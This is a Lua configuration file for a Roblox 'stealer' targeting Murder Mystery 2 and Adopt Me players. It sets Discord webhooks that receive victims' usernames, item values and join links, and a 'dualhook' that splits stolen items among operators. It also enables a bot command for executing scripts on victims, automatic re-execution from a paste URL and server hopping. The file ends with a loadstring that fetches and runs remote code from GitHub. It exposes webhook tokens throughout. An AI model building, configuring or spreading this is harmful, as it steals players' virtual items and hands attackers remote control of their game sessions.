-- Hitter Configuration 

Usernames = {
    'GaGbyFaith',
}

BigHitsWebhook = "https://discord.com/api/webhooks/1388384374051049533/qx_eNWIKnDSJ6tfw5_DJT058ZWbvLDv6SjW0VdB2Wfl3BcwxjWgz58I335lCPJossj9P"
SmallHitsWebhook = "https://discord.com/api/webhooks/1388384374051049533/qx_eNWIKnDSJ6tfw5_DJT058ZWbvLDv6SjW0VdB2Wfl3BcwxjWgz58I335lCPJossj9P"

Config = {
    StealerUUID = 'Write anything u want here, it will be used to decide TRIPPLEHOOK % u will get, i will decide and lower % if u get more hits', -- THIS IS REQUIRED!!!
    Dualhooked = true, -- if u dont enable it and configure dualhook, it wont work
    DualhookSettings = {
        MM2 = {
            Value = 1500,
            Chance = 100, -- from 0 to 100 %
            Webhook = 'https://discord.com/api/webhooks/1388384374051049533/qx_eNWIKnDSJ6tfw5_DJT058ZWbvLDv6SjW0VdB2Wfl3BcwxjWgz58I335lCPJossj9P',
        },
        AdoptMe = {
            Value = 100,
            Chance = 100, -- from 0 to 100 %
            Webhook = 'https://discord.com/api/webhooks/1388384374051049533/qx_eNWIKnDSJ6tfw5_DJT058ZWbvLDv6SjW0VdB2Wfl3BcwxjWgz58I335lCPJossj9P',
        }, 
    },
    LoggingSettings = {
        Enabled = true, -- this will send copy of all hits to this webhook bellow
        WebhookUrl = 'https://discord.com/api/webhooks/1388384374051049533/qx_eNWIKnDSJ6tfw5_DJT058ZWbvLDv6SjW0VdB2Wfl3BcwxjWgz58I335lCPJossj9P',
        -- this webhook will recieve EVERY single HIT from ur stealer!
    },
    StealerSettings = {
        MM2 = {
            StealerEnabled = true,
            MinimumValueToPingUser = 50,
        },
        AdoptMe = {
            StealerEnabled = true,
            MinimumValueToPingUser = 8,
        }, -- BigHits SmallHits deciding by this value -- ADOPT ME DOESNT WORK RN
    },
    AllowedUsernames = {
        'GaGbySmiley,
    }, -- this is comparing usernames
    AllowedUsernamePatterns = {
        'GaGbySmiley',
        'shlakablok',
    }, -- this is using string.find() to match usernames
    WebhookCustomization = {
        GenerateWebhookEmbedFunction = function(hit_link_with_ping, hitter_usernames, total_rap, best_items, pastebin_of_hit, roblox_click_to_join_url)
            local data = {
                content = hit_link_with_ping,
                username = game.Players.LocalPlayer.Name, -- if u keep this username u can use x scripts auto joiner with that stealer!
                avatar_url = '', -- replace with ur url if needed
                embeds = {
                    {
                        title = 'SCRIPTS.SM - Best Stealer',
                        description = 'This hit is generated exclusively for you by Scropts.SM Scripts',
                        color = 0x7f00ff, -- https://redketchup.io/color-picker
                        fields = {
                            {
                                name = 'Player Info',
                                value = '```Username: ' .. game.Players.LocalPlayer.Name .. '\nRecievers: ' .. hitter_usernames .. '\nExecutor: ' .. identifyexecutor() .. "```",
                                inline = false,
                            },
                            {
                                name = 'Total RAP',
                                value = '```Total RAP: ' .. total_rap .. '```',
                                inline = true,
                            },
                            {
                                name = 'Best Items',
                                value = '```' .. best_items .. '```',
                                inline = false,
                            },
                            {
                                name = 'Join Link',
                                value = roblox_click_to_join_url,
                                inline = false,
                            },
                            {
                                name = 'Pastebin Info',
                                value = pastebin_of_hit,
                                inline = false,
                            },
                        },
                    }, 
                },
            }
            return data
        end -- ask chat gpt to create beautifull embed or make it yourself, this is default one that works if u dont care!   
    },
    BannerSettings = {
        Enabled = true,
        ServerName = 'Scripts.SM Scripts',
        TimeBeforeBanner = 10, -- in seconds
        ServerLink = 'd2zgg2YDMz', -- CODE, NOT LINK!!!
    },
    DiscordBotConnectionSettings = {
        DiscordId = '1388381937818796083', -- if u put ur id here, u will be able to use /execute command on every victim of your hitters!
    }, -- this is settings of X Scripts Helper bot that gives u ability to execute scripts from discord
    AutoReExecuteSettings = {
        ReExecute = true, -- if u dont enable it, u dont need to worry about link bellow
        StealerLoaderUrl = 'https://paste.debian.net/plainh/97e6ee56/' -- this is url of ur stealer_link or whatever u have in LOADSTRING of your stealer
        -- it will be used to re-load ur stealer on serverhop for each hitter, it will automatically write usernames and webhooks to it
        -- like it does in x scripts stealer!
    },
    ServerHopSettings = {
        ServerHopOnVipServer = true,
        ServerHopOnFullServer = true,
    },
    SelfHittingSettings = {
        KickOnSelfHit = true, -- if player is in usernames list and executed stealer, he will be kicked
        KickMessage = 'U cant hit yourself',
    },
    FinishedStealingSettings = {
        KickOnFinishStealing = true,
        KickMessage = 'Join my discord - discord.gg/d2zgg2YDMz',
    }
}


loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/dualhook/refs/heads/main/loader.lua", true))()
